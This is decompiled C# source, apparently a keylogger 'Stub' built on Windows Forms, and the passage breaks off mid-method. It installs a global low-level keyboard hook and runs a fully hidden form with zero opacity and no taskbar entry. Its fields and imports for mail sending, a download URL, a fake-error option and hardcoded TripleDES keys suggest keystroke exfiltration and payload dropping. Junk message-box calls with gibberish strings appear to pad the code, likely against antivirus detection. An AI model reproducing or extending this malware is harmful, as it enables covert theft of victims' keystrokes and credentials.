using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Stub.My;

namespace Stub;

[DesignerGenerated]
public class Form1 : Form
{
	public class KeyboardHook
	{
		private struct KBDLLHOOKSTRUCT
		{
			public int vkCode;

			public int scancode;

			public int flags;

			public int time;

			public int dwExtraInfo;
		}

		private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

		public delegate void KeyDownEventHandler(Keys Key);

		public delegate void KeyUpEventHandler(Keys Key);

		private const int HC_ACTION = 0;

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private const int WM_KEYUP = 257;

		private const int WM_SYSKEYDOWN = 260;

		private const int WM_SYSKEYUP = 261;

		private static KeyDownEventHandler KeyDownEvent;

		private static KeyUpEventHandler KeyUpEvent;

		private static int KeyHook;

		private static KeyboardProcDelegate KeyHookDelegate;

		public static event KeyDownEventHandler KeyDown
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
			}
		}

		public static event KeyUpEventHandler KeyUp
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
			}
		}

		public void one()
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			Interaction.MsgBox((object)"HI", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"Welcome", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"Bye", (MsgBoxStyle)0, (object)null);
		}

		public void kaka()
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			Interaction.MsgBox((object)"HI", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"Welcome", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"Bye", (MsgBoxStyle)0, (object)null);
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		public KeyboardHook()
		{
			KeyHookDelegate = KeyboardProc;
			KeyHook = SetWindowsHookExA(13, KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		public void three()
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_0055: Unknown result type (might be due to invalid IL or missing references)
			//IL_0062: Unknown result type (might be due to invalid IL or missing references)
			//IL_006f: Unknown result type (might be due to invalid IL or missing references)
			//IL_007c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0089: Unknown result type (might be due to invalid IL or missing references)
			//IL_0096: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
			Interaction.MsgBox((object)"346erygdfdsfgsdfcv@#$%^&^%#yq3456yw4W%^@$%&YRTy345yQ$RTG", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"346erygdfdsfgsdfcv@#$%^&^%#yq3456yw4W%^@$%&YRTy345yQ$RTG", (MsgBoxStyle)0, (object)null);
		}

		private static int KeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
					KeyDownEvent?.Invoke((Keys)lParam.vkCode);
					break;
				case 257:
				case 261:
					KeyUpEvent?.Invoke((Keys)lParam.vkCode);
					break;
				}
			}
			return CallNextHookEx(KeyHook, nCode, wParam, lParam);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(KeyHook);
			base.Finalize();
		}
	}

	private IContainer components;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	private string ssn;

	private readonly byte[] key;

	private readonly byte[] iv;

	private cTripleDES des;

	private string[] options;

	private string txt1;

	private string txt2;

	private string text1;

	private string text2;

	private string interval;

	private string cb;

	private string cb2;

	private string cb3;

	private string cb4;

	private string cb5;

	private string Title;

	private string msg;

	private string DownloadUrl;

	private string fakeerrorchecker;

	private string tdownloaderchecker;

	private const string FileSplit = "/lfgvealviajehfbas/";

	[AccessedThroughProperty("ckbHook")]
	private KeyboardHook _ckbHook;

	private string strin;

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer4 = value;
		}
	}

	private virtual KeyboardHook ckbHook
	{
		[DebuggerNonUserCode]
		get
		{
			return _ckbHook;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			KeyboardHook.KeyDownEventHandler value2 = shiftandcaps;
			if (_ckbHook != null)
			{
				KeyboardHook.KeyDown -= value2;
			}
			_ckbHook = value;
			if (_ckbHook != null)
			{
				KeyboardHook.KeyDown += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		ssn = "0";
		key = new byte[24]
		{
			1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
			11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
			21, 22, 23, 24
		};
		iv = new byte[8] { 255, 70, 60, 50, 40, 30, 20, 10 };
		des = new cTripleDES(key, iv);
		ckbHook = new KeyboardHook();
		strin = null;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		components = new Container();
		TextBox3 = new TextBox();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		Timer3 = new Timer(components);
		Timer2 = new Timer(components);
		Timer1 = new Timer(components);
		TextBox4 = new TextBox();
		Timer4 = new Timer(components);
		((Control)this).SuspendLayout();
		((TextBoxBase)TextBox3).set_BorderStyle((BorderStyle)1);
		TextBox textBox = TextBox3;
		Point location = new Point(121, 168);
		((Control)textBox).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox2 = TextBox3;
		Size size = new Size(121, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox3).set_TabIndex(6);
		((TextBoxBase)TextBox2).set_BorderStyle((BorderStyle)1);
		TextBox textBox3 = TextBox2;
		location = new Point(0, 168);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(121, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(5);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)1);
		((Control)TextBox1).set_Dock((DockStyle)1);
		TextBox textBox5 = TextBox1;
		location = new Point(0, 0);
		((Control)textBox5).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox6 = TextBox1;
		size = new Size(8, 167);
		((Control)textBox6).set_Size(size);
		((Control)TextBox1).set_TabIndex(4);
		((TextBoxBase)TextBox4).set_BorderStyle((BorderStyle)1);
		TextBox textBox7 = TextBox4;
		location = new Point(0, 191);
		((Control)textBox7).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox8 = TextBox4;
		size = new Size(242, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox4).set_TabIndex(7);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(8, 16);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public void b3lah()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0209: Unknown result type (might be due to invalid IL or missing references)
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_0223: Unknown result type (might be due to invalid IL or missing references)
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_024a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0264: Unknown result type (might be due to invalid IL or missing references)
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Unknown result type (might be due to invalid IL or missing references)
		//IL_028b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0298: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0300: Unknown result type (might be due to invalid IL or missing references)
		//IL_030d: Unknown result type (might be due to invalid IL or missing references)
		//IL_031a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0327: Unknown result type (might be due to invalid IL or missing references)
		//IL_0334: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Unknown result type (might be due to invalid IL or missing references)
		//IL_034e: Unknown result type (might be due to invalid IL or missing references)
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Unknown result type (might be due to invalid IL or missing references)
		//IL_0382: Unknown result type (might be due to invalid IL or missing references)
		//IL_038f: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0404: Unknown result type (might be due to invalid IL or missing references)
		//IL_0411: Unknown result type (might be due to invalid IL or missing references)
		//IL_041e: Unknown result type (might be due to invalid IL or missing references)
		//IL_042b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0438: Unknown result type (might be due to invalid IL or missing references)
		//IL_0445: Unknown result type (might be due to invalid IL or missing references)
		//IL_0452: Unknown result type (might be due to invalid IL or missing references)
		//IL_045f: Unknown result type (might be due to invalid IL or missing references)
		//IL_046c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0479: Unknown result type (might be due to invalid IL or missing references)
		//IL_0486: Unknown result type (might be due to invalid IL or missing references)
		//IL_0493: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0508: Unknown result type (might be due to invalid IL or missing references)
		//IL_0515: Unknown result type (might be due to invalid IL or missing references)
		//IL_0522: Unknown result type (might be due to invalid IL or missing references)
		//IL_052f: Unknown result type (might be due to invalid IL or missing references)
		//IL_053c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0549: Unknown result type (might be due to invalid IL or missing references)
		//IL_0556: Unknown result type (might be due to invalid IL or missing references)
		//IL_0563: Unknown result type (might be due to invalid IL or missing references)
		//IL_0570: Unknown result type (might be due to invalid IL or missing references)
		//IL_057d: Unknown result type (might be due to invalid IL or missing references)
		//IL_058a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0597: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		bool flag = false;
		while (flag)
		{
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
